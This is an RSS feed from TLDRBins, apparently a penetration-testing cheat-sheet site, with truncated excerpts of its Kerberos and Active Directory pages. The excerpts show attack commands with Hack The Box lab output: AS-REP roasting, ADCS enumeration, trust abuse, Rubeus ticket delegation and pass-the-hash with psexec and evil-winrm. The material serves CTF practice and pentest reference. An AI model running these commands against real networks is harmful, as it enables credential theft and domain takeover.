<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Kerberos on TLDRBins</title>
    <link>https://tldrbins.github.io/@kerberos/</link>
    <description>Recent content in Kerberos on TLDRBins</description>
    <generator>Hugo</generator>
    <language>en-us</language>
    <atom:link href="https://tldrbins.github.io/@kerberos/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Abuse Parent-Child Domain Trusts</title>
      <link>https://tldrbins.github.io/abuse_parent_child_domain_trusts/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/abuse_parent_child_domain_trusts/</guid>
      <description>Privesc from DA (Domain Admin) to EA (Enterprise Admin) Windows 1. Check Trust Relationships # Get all trusted domain objects in a forest Get-ADTrust -Filter * PS C:\Windows\system32&amp;gt; Get-ADTrust -Filter * Direction : BiDirectional DisallowTransivity : False DistinguishedName : CN=example.com,CN=System,DC=corp,DC=example,DC=com ForestTransitive : False IntraForest : True IsTreeParent : False IsTreeRoot : False Name : example.com ObjectClass : trustedDomain ObjectGUID : b0c64079-6f51-4516-9a62-90f94666bfc1 SelectiveAuthentication : False SIDFilteringForestAware : False SIDFilteringQuarantined : False Source : DC=corp,DC=example,DC=com Target : example.</description>
    </item>
    <item>
      <title>ADCS</title>
      <link>https://tldrbins.github.io/adcs/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/adcs/</guid>
      <description>Enum (From Linux) certipy-ad nxc # Password certipy-ad find -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -target &amp;lt;TARGET&amp;gt; -text -stdout -vulnerable # NTLM certipy-ad find -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -hashes &amp;#39;&amp;lt;HASH&amp;gt;&amp;#39; -target &amp;lt;TARGET&amp;gt; -text -stdout -vulnerable # Password nxc ldap &amp;lt;TARGET&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -M adcs # NTLM nxc ldap &amp;lt;TARGET&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -H &amp;#39;&amp;lt;HASH&amp;gt;&amp;#39; -M adcs Enum (From Windows) powershell certify ADCSTemplate # Check ADCS service net start | findstr /i cert # Check env certutil # List cert templates certutil -catemplates # Get info of each template .</description>
    </item>
    <item>
      <title>Kerberoasting</title>
      <link>https://tldrbins.github.io/roasting/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/roasting/</guid>
      <description>AS_REP Roasting Impacket nxc # Multiple valid usernames impacket-GetNPUsers &amp;lt;DOMAIN&amp;gt;/ -usersfile &amp;lt;USERS_FILE&amp;gt; -no-pass -dc-ip &amp;lt;DC_IP&amp;gt; $ impacket-GetNPUsers ABSOLUTE.HTB/ -usersfile valid_usernames.txt -no-pass -dc-ip DC.ABSOLUTE.HTB Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies [-] User j.roberts doesn&amp;#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User m.chaffrey doesn&amp;#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User s.osvald doesn&amp;#39;t have UF_DONT_REQUIRE_PREAUTH set $krb5asrep$23$d.klay@ABSOLUTE.HTB:85554d22d5c220d8a757ce9913d207ea$7288c91ca ---[SNIP]--- 0e09c5d9d1 [-] User j.robinson doesn&amp;#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User n.smith doesn&amp;#39;t have UF_DONT_REQUIRE_PREAUTH set # Single user without creds impacket-GetNPUsers -no-pass -dc-ip &amp;lt;DC_IP&amp;gt; &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;&amp;#39; $ impacket-GetNPUsers -no-pass -dc-ip 10.</description>
    </item>
    <item>
      <title>Kerberos</title>
      <link>https://tldrbins.github.io/kerberos/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/kerberos/</guid>
      <description>Users Enum kerbrute metasploit kerbrute userenum --domain &amp;lt;DOMAIN&amp;gt; --dc &amp;lt;DC&amp;gt; &amp;lt;USERS_FILE&amp;gt; $ kerbrute userenum --domain absolute.htb --dc dc.absolute.htb usernames.txt __ __ __ / /_____ _____/ /_ _______ __/ /____ / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \ / ,&amp;lt; / __/ / / /_/ / / / /_/ / /_/ __/ /_/|_|\___/_/ /_.___/_/ \__,_/\__/\___/ Version: v1.0.3 (9dad6e1) - 09/24/24 - Ronnie Flathers @ropnop 2024/09/24 14:54:41 &amp;gt; Using KDC(s): 2024/09/24 14:54:41 &amp;gt; dc.</description>
    </item>
    <item>
      <title>LDAP</title>
      <link>https://tldrbins.github.io/ldap/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/ldap/</guid>
      <description>Enum ldapsearch ldapdomaindump nmap # Get domain base ldapsearch -x -H ldap://&amp;lt;TARGET&amp;gt; -s base namingcontexts # Get all from domain ldapsearch -x -H ldap://&amp;lt;TARGET&amp;gt; -b &amp;#39;DC=&amp;lt;EXAMPLE&amp;gt;,DC=&amp;lt;COM&amp;gt;&amp;#39; # Just get a class (e.g. person) ldapsearch -x -H ldap://&amp;lt;TARGET&amp;gt; -b &amp;#39;DC=&amp;lt;EXAMPLE&amp;gt;,DC=&amp;lt;COM&amp;gt;&amp;#39; &amp;#39;(objectClass=person)&amp;#39; # With creds ldapsearch -x -H ldap://&amp;lt;TARGET&amp;gt; -D &amp;#34;CN=&amp;lt;USER&amp;gt;,CN=Users,DC=&amp;lt;EXAMPLE&amp;gt;,DC=&amp;lt;COM&amp;gt;&amp;#34; -w &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -b &amp;#39;DC=&amp;lt;EXAMPLE&amp;gt;,DC=&amp;lt;COM&amp;gt;&amp;#39; # With creds ldapdomaindump -u &amp;#39;&amp;lt;DOMAIN&amp;gt;\&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; &amp;lt;TARGET&amp;gt; -o ./ldap # Using nmap script sudo nmap -p 389 --script ldap-search &amp;lt;TARGET&amp;gt; Enum with Kerberos ldapsearch nxc # Add GSSAPI sudo apt install libsasl2-modules-gssapi-mit ldapsearch -H ldap://&amp;lt;TARGET&amp;gt; -Y GSSAPI -b &amp;#39;DC=&amp;lt;EXAMPLE&amp;gt;,DC=&amp;lt;COM&amp;gt;&amp;#39; # With kerberos nxc ldap &amp;lt;TARGET&amp;gt; -u &amp;lt;USER&amp;gt; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -k --users Enum ACLs bloodyAD 1.</description>
    </item>
    <item>
      <title>Machine Account</title>
      <link>https://tldrbins.github.io/machine_account/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/machine_account/</guid>
      <description>Abuse #1: Microsoft virtual account 1. Create a ticket from Microsoft virtual account Windows .\rubeus.exe tgtdeleg /nowrap /ptt PS C:\programdata&amp;gt; .\rubeus.exe tgtdeleg /nowrap /ptt ______ _ (_____ \ | | _____) )_ _| |__ _____ _ _ ___ | __ /| | | | _ \| ___ | | | |/___) | | \ \| |_| | |_) ) ____| |_| |___ | |_| |_|____/|____/|_____)____/(___/ v2.3.2 [*] Action: Request Fake Delegation TGT (current user) [*] No target SPN specified, attempting to build &amp;#39;cifs/dc.</description>
    </item>
    <item>
      <title>SMB Enum</title>
      <link>https://tldrbins.github.io/smb_enum/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/smb_enum/</guid>
      <description>SMB Share Enum nmap sudo nmap --script=smb-enum-shares -p 445 &amp;lt;TARGET&amp;gt; $ sudo nmap --script=smb-enum-shares -p 445 10.10.11.207 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-25 04:53 GMT Nmap scan report for 10.10.11.207 Host is up (0.26s latency). PORT STATE SERVICE 445/tcp open microsoft-ds Nmap done: 1 IP address (1 host up) scanned in 7.96 seconds Anonymous Login smbmap smbclient impacket smbmap -H &amp;lt;TARGET&amp;gt; --no-banner smbmap -H &amp;lt;TARGET&amp;gt; -u null --no-banner # List known share smbmap -H &amp;lt;TARGET&amp;gt; -r &amp;lt;SHARE&amp;gt; smbclient -N -L \\\\&amp;lt;TARGET&amp;gt;\\ $ smbclient -N -L \\\\10.</description>
    </item>
    <item>
      <title>Winrm</title>
      <link>https://tldrbins.github.io/winrm/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/winrm/</guid>
      <description>Psexec Password Hash # Domain auth impacket-psexec &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET&amp;gt;&amp;#39; # Local auth impacket-psexec &amp;#39;&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET&amp;gt;&amp;#39; # Domain auth impacket-psexec &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;@&amp;lt;TARGET&amp;gt;&amp;#39; -hashes :&amp;lt;HASH&amp;gt; # Local auth impacket-psexec &amp;#39;&amp;lt;USER&amp;gt;@&amp;lt;TARGET&amp;gt;&amp;#39; -hashes :&amp;lt;HASH&amp;gt; Evil-Winrm Password Hash Kerberos crt &amp; key evil-winrm -i &amp;lt;TARGET&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; $ evil-winrm -i 127.0.0.1 -u dr.zaiuss -p &amp;#39;qwe123QWE!@#&amp;#39; Evil-WinRM shell v3.5 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM GitHub: https://github.</description>
    </item>
    <item>
      <title>Winrm from Windows VM</title>
      <link>https://tldrbins.github.io/winrm_from_windows_vm/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/winrm_from_windows_vm/</guid>
      <description>Preparation 0. Check Systeminfo # Windows Pro is needed systeminfo 1. Connect to VPN OpenVPN client&#xA;2. Add DNS Server +-----------------------------------------------------------------------------------+ | 1. Go to &amp;#39;Control Panel\Network and Internet\Network and Sharing Center&amp;#39; | | 2. Click &amp;#39;Local Area Connection&amp;#39; | | 3. Go to &amp;#39;Properties&amp;#39; -&amp;gt; &amp;#39;Internet Protocol Version 4 (TCP/IPv4)&amp;#39; -&amp;gt; &amp;#39;Properties&amp;#39; | | 4. Under &amp;#39;General&amp;#39;, check &amp;#39;Obtain an IP address automatically&amp;#39; | | 5. Check &amp;#39;Use the following DNS address&amp;#39; -&amp;gt; &amp;#39;Prefer DNS Server&amp;#39; -&amp;gt; &amp;lt;DC_IP&amp;gt; | +-----------------------------------------------------------------------------------+ 3.</description>
    </item>
  </channel>
</rss>
